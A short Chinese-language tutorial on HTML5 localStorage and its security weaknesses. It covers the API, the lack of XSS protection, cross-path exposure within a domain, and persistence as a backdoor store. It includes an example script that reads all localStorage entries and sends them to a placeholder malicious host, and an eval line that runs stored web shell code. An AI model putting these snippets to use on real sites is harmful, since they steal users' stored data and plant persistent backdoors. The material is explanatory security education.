##简介
----

* HTML5本地存储被视作是新时代Cookie的替代品。HTML5的本地存储是使用localStorage对象将WEB数据持久化在本地。相比较而言HTML5本地存储中每个域的存储大小默认是5M，比起Cookie的4K要大的多。而且存储和读取数据的代码极为简练： 

* 主要接口函数有下面几个：

	Window.localStorage.setItem(key,value);//存储数据  
	Window.localStorage.getItem(key);//读取数据  
	Window.localStorage.removeItem(key);//删除数据项  
	Window.localStorage.clear();//删除所有数据  

----

##安全问题

####没有XSS的保护机制

* cookie有httponly等属性能够保护cookie不被xss攻击，但是localStorage就没有。一旦发生XSS，攻击者能够直接获得存储的信息。
攻击代码示例：

<pre><code>var i = 0;  
var str = "";  
while (localStorage.key(i) != null)  
{  
var key = localStorage.key(i);  
	str += key + ": " + localStorage.getItem(key);  
	i++;  
}  
document.location="http://your-malicious-site.com?stolen="+ str;
</pre></code>

####容易遭受跨目录攻击

* cookie可以指定域中的存储路径，但是localStorage没有这样的概念。也就是说，如果同一个域下的任意路径存在XSS漏洞，整个域下存储的数据在知道存储名称的情况下都可以被获取到。

* 例如，现在有两个用户Jack 和Tom，他们共同在某网站下有一个博客如：blog.xxx.com/Jack , blog.xxx.com/Tom 。现在Jack发现了该网站的一个XSS漏洞，那么他在自己的博客中存储下xss攻击代码。那么Tom只要访问 blog.xxx.com/Jack , 就会把自己本地的localStorage数据暴露给XSS代码。

####可以作为恶意代码存储的温床

localStorage的存储是永久的，那么就可以作为web shell code 的存储位置，这样在xss中添加类似这样的代码 

	eval(window.localStorage.getItem("webshellcode"));

就能够取出shellcode进行攻击。从而留下了后门。